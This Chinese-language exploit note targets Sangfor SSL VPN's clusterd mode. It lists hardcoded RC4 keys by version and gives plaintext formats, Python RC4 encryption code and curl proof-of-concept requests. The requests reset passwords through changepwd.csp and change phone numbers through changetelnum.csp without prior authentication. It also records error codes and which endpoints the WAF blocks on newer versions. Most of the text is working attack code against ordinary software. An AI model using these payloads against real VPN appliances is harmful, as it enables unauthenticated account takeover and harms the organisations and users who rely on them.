# Sangfor SSL VPN RC4 集群认证机制

## 原理
深信服 SSL VPN 的集群(clusterd)模式下，部分管理操作使用 RC4 加密的会话参数。
攻击者可伪造加密数据在预认证状态下执行敏感操作。

## 已知 RC4 Key

| 版本 | Key | 来源 |
|------|-----|------|
| M7.6.1 | 20100720 | PeiQi 文库 |
| M7.6.6R1 | 20181118 | PeiQi 文库 |
| M7.6.8R2 | **未知** | 高版本据报道已移除相关函数 |
| 其他版本 | "另寻" | 公开资料未披露 |

**Key 模式**: 日期格式 YYYYMMDD，可能与版本发布日期相关。

## changepwd.csp 密码重置

### 明文格式
```
,username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=OLD_PASSWORD,newpsw=NEW_PASSWORD,
```

### RC4 加密 (Python)
```python
import binascii

def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

key = b'20181118'
plaintext = b',username=admin,ip=127.0.0.1,grpid=1,pripsw=oldpass,newpsw=newpass,'
encrypted = rc4(key, plaintext)
hex_str = binascii.hexlify(encrypted).decode()
```

### curl PoC
```bash
curl -sk -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "sessReq=clusterd&sessid=0&str=${RC4_HEX}&len=${RC4_LEN}" \
  'https://TARGET/por/changepwd.csp'
```

## changetelnum.csp 手机号修改

### 明文格式
```
,username=TARGET_USERNAME,ip=127.0.0.1,grpid=0,newtel=TARGET_PHONE,
```

### curl PoC (明文，无需 RC4)
```bash
curl -sk 'https://TARGET/por/changetelnum.csp?apiversion=1&sessReq=clusterd&sessid=0&username=admin&grpid=0&newtel=13800138000&ip=127.0.0.1'
```

### 错误码
- `3` — 需要加密 str 参数 (明文不接受)
- `6` — 加密数据存在但解密失败 (RC4 key 错误)
- `20026` — "unexpected user service" (changepwd WAF 绕过后)

## M7.6.8R2 现状
- changepwd.csp 端点仍存在 (200)
- `sessReq=clusterd` 被 WAF 精确拦截 (404)
- changetelnum.csp 不受 WAF 限制
- RC4 key 未公开
- 公开资料称 "高版本直接删除相关函数"，但端点仍可访问
- 无法在无正确 key 的情况下构造有效 payload
